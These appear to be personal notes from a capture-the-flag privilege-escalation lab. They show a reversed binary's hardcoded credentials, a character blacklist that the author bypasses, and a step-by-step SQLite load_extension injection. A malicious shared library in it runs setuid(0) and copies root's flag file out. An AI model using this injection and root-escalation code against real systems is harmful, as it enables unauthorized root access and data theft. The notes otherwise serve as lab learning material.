lsoIn the symbol table we find the main_menu function which seems to be the main entry point for the binary, and from there we find the username and password
`moriarty:findMeIfY0uC@nMr.Holmz!`

![[Pasted image 20231202051738.png]]

looking at the main_menu function we get
![[Pasted image 20231202051806.png]]

## exploitation
so in order to exploit this, the main thing were looking out for is user input in any of the functions, and in fact we do have one function called `5. Activate user account`
- activate_user_account
![[Pasted image 20231202052048.png]]
as we can see the if condition checks if the username is empty, and when its not (else block) it calls a function called `sanitize_string`, lets check it out

- sanitize_string
```c

void sanitize_string(long username)

{
  bool bVar1;
  ulong uVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  uint i;
  undefined8 blacklist;
  undefined local_21;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_3c = 0;
  blacklist = 0x5c7b2f7c20270a00; //array of blacklist char \{/| ' 
  local_21 = 0x3b; // ; semicolor
  local_38 = 0;
  do {
    uVar2 = FUN_00401180(username);
    if (uVar2 <= (ulong)(long)local_38) {
      *(undefined *)(username + local_3c) = 0;
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail(); //stack smashing detection function
      }
      return;
    }
    bVar1 = false;
    for (i = 0; i < 9; i = i + 1) {
      if (*(char *)(username + local_38) == *(char *)((long)&blacklist + (long)(int)i)) {
        bVar1 = true; //if username has blacklist char, break
        break;
      }
    }
    if (!bVar1) {
      *(undefined *)(local_3c + username) = *(undefined *)(local_38 + username);
      local_3c = local_3c + 1; // do something? idk
    }
    local_38 = local_38 + 1; //no idea either?
  } while( true );
}
```
blacklist characters `\{/| '`

so with this link
https://stackoverflow.com/questions/12424883/is-it-possible-to-test-if-loading-extensions-is-enabled-in-sqlite-3
we see that the load_extension is enabled
![[Pasted image 20231202055037.png]]

Now the whole idea of the exploit is to load a malicious module, which could be anything like reading root.txt or setting SUID on /bin/bash, so we create a malicious c file to cat root.txt 

its also important to note that the load_extension takes in shared library files, now if we look at the documentation of sqlite https://www.sqlite.org/loadext.html, and i qoute `"Note that different operating systems use different filename suffixes for their shared libraries. Windows uses ".dll", Mac uses ".dylib", and most unixes other than mac use ".so". If you want to make your code portable, you can omit the suffix from the shared library filename and the appropriate suffix will be added automatically by the sqlite3_load_extension() interface."` means we need to have a `.so` file.

reading further down we also see them mentioning the naming convetion of load_extension
![[Pasted image 20231202061632.png]]
armed with this information and sanitize_string check we need to do the following
- Dont overrun the username input limit (48 characters)
![[Pasted image 20231202061820.png]]
- name our extension like `sqlite3_a_init`
- substitute for blacklisted characers (use decimal to substitute for `.` from ascii table)
- escape the query
- the effective query becomes 
```bash
"/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"\""+load_extension(char(46,47,98))+"\'"
```

## steps
1) create a c file 
```c
#include <unistd.h>
#include<stdlib.h>
void sqlite3_b_init() {
        setuid(0);
        setgid(0);
        system("/usr/bin/cat /root/root.txt > /tmp/guys.txt");
}
```
2) compile it as a shared library
```bash
 gcc -shared -o b.so -fPIC b.c
```
3) run the binary -> login -> select option 5
![[Pasted image 20231202065239.png]]
5) exit out and cat`/tmp/guys.txt`
![[Pasted image 20231202065253.png]]
- sql query
```sql
"/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"\";\'"
```
payload 
```bash
"+load_extension(char(46,47,98))+"
46 is . in ascii dec
47 is / in ascii dec
98 is b in ascii dec
```

side node: i tried getting a reverse shell but its broken i couldnt run any commands